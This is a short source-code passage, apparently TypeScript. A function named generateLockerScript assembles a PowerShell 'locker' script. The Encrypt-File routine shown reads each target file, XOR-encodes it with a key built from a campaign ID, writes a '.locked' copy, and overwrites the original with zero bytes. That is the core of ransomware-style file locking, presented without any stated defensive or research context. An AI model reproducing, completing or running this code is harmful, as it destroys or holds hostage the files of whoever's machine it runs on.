...
export function generateLockerScript(
  ...
  lines.push("");
  lines.push("# Encrypt a single file");
  lines.push("function Encrypt-File {");
  lines.push("  param([string]$Path)");
  lines.push("  try {");
  lines.push("    $c = [System.IO.File]::ReadAllBytes($Path)");
  lines.push("    $e = [System.Convert]::ToBase64String($c)");
  lines.push("    $k = [System.Text.Encoding]::UTF8.GetBytes('" + campaignId + "')");
  lines.push("    $r = New-Object byte[] $e.Length");
  lines.push("    for ($i = 0; $i -lt $e.Length; $i++) { $r[$i] = $e[$i] -bxor $k[$i % $k.Length] }");
  lines.push("    [System.IO.File]::WriteAllBytes($Path + '.locked', $r)");
  lines.push("    [System.IO.File]::WriteAllBytes($Path, (New-Object byte[] $c.Length))");
